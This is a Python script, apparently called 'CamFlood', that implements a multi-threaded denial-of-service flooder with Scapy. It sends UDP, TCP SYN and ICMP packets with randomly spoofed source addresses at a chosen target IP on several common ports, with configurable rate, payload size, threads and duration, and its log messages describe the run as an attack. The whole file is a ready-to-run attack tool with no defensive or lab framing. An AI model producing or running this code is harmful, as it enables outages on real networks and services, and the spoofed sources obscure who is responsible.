import random
import threading
import time
import logging
import argparse
import signal
from scapy.all import IP, UDP, TCP, ICMP, Raw, send, sr1, ARP
from dataclasses import dataclass
from typing import Optional, List, Dict, Callable
from queue import Queue, Empty
from functools import partial

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

@dataclass
class FloodConfig:
    target_ip: str
    rate_limit: int
    payload_size: int
    threads: int
    duration: int
    ports: List[int] = (80, 443, 8080, 53)
    protocols: List[str] = ("udp", "tcp", "icmp")

class PacketFlooder:
    def __init__(self, config: FloodConfig):
        self.config = config
        self.stop_event = threading.Event()
        self.packet_count = 0
        self.thread_list: List[threading.Thread] = []
        self.packet_queue = Queue(maxsize=1000)
        self.protocol_handlers: Dict[str, Callable] = {
            "udp": self._create_udp_packet,
            "tcp": self._create_tcp_packet,
            "icmp": self._create_icmp_packet,
        }
        self.lock = threading.Lock()

    def resolve_mac(self, target_ip: str) -> Optional[str]:
        arp_req = ARP(pdst=target_ip)
        resp = sr1(arp_req, timeout=2, verbose=0)
        if resp:
            mac = resp.hwsrc
            logging.info(f"MAC address of target {target_ip} resolved: {mac}")
            return mac
        logging.warning(f"Unable to resolve MAC address of target {target_ip}. Using broadcast.")
        return None

    def generate_fake_ip(self) -> str:
        return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"

    def _create_udp_packet(self, target_ip: str, payload: bytes, port: int) -> IP:
        return IP(src=self.generate_fake_ip(), dst=target_ip) / UDP(dport=port) / Raw(load=payload)

    def _create_tcp_packet(self, target_ip: str, payload: bytes, port: int) -> IP:
        return IP(src=self.generate_fake_ip(), dst=target_ip) / TCP(dport=port, flags="S") / Raw(load=payload)

    def _create_icmp_packet(self, target_ip: str, payload: bytes, port: int) -> IP:
        return IP(src=self.generate_fake_ip(), dst=target_ip) / ICMP() / Raw(load=payload)

    def flood_packet(self, target_ip: str, payload: bytes, protocol: str, port: int) -> bool:
        try:
            packet = self.protocol_handlers[protocol](target_ip, payload, port)
            send(packet, verbose=0)
            return True
        except Exception as e:
            logging.error(f"Error sending {protocol.upper()} packet to {target_ip}:{port} - {e}", exc_info=True)
            return False

    def worker(self, thread_id: int):
        thread_packets = 0
        end_time = time.perf_counter() + self.config.duration
        while time.perf_counter() < end_time and not self.stop_event.is_set():
            try:
                task = self.packet_queue.get(timeout=0.1)
                if self.flood_packet(task["target_ip"], task["payload"], task["protocol"], task["port"]):
                    thread_packets += 1
                self.packet_queue.task_done()
            except Empty:
                continue

        with self.lock:
            self.packet_count += thread_packets

        logging.info(f"Thread-{thread_id} finished. Sent {thread_packets} packets.")

    def start_flood(self):
        payload = b"A" * self.config.payload_size
        self.resolve_mac(self.config.target_ip)

        for i in range(self.config.threads):
            t = threading.Thread(target=self.worker, args=(i,), daemon=True)
            t.start()
            self.thread_list.append(t)

        end_time = time.perf_counter() + self.config.duration
        while time.perf_counter() < end_time and not self.stop_event.is_set():
            for port in self.config.ports:
                for protocol in self.config.protocols:
                    self.packet_queue.put({
                        "target_ip": self.config.target_ip,
                        "payload": payload,
                        "protocol": protocol,
                        "port": port
                    })
            time.sleep(1 / self.config.rate_limit)

        for t in self.thread_list:
            t.join()

        logging.info(f"Total packets sent: {self.packet_count}")

def signal_handler(flooder: PacketFlooder, sig, frame):
    logging.info("Interrupt detected, stopping attack...")
    flooder.stop_event.set()

def main():
    parser = argparse.ArgumentParser(description="UDP/TCP/ICMP CamFlood")
    parser.add_argument("target_ip", type=str, help="Target IP address")
    parser.add_argument("--rate", type=int, default=100, help="Packets per second (default: 100)")
    parser.add_argument("--payload", type=int, default=512, help="Payload size in bytes (default: 512)")
    parser.add_argument("--threads", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("--duration", type=int, default=30, help="Duration of the attack in seconds (default: 30)")
    args = parser.parse_args()

    config = FloodConfig(
        target_ip=args.target_ip,
        rate_limit=args.rate,
        payload_size=args.payload,
        threads=args.threads,
        duration=args.duration
    )

    flooder = PacketFlooder(config)
    signal.signal(signal.SIGINT, partial(signal_handler, flooder))
    logging.info(f"Starting attack on {args.target_ip} for {args.duration} seconds with {args.threads} threads...")
    
    flooder.start_flood()

    logging.info("Attack finished.")

if __name__ == "__main__":
    main()
